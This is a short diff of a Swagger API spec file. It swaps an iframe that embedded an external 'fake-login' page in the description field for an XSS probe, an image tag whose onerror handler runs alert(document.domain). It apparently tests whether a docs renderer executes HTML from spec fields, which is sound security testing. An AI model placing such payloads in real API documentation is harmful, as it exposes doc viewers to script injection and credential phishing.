@@ -1,14 +1,10 @@
 swagger: '2.0'
 info:
-  title: Test Login Page
+  title: XSS Test
   description: |
-    <iframe src="https://zeedonex.github.io/fake-login/" 
-            width="100%" 
-            height="600" 
-            style="border:1px solid #ccc;">
-    </iframe>
+    <img src="x" onerror="alert(document.domain)">
 paths:
-  /test:
+  /xss:
     get:
       responses:
         '200':
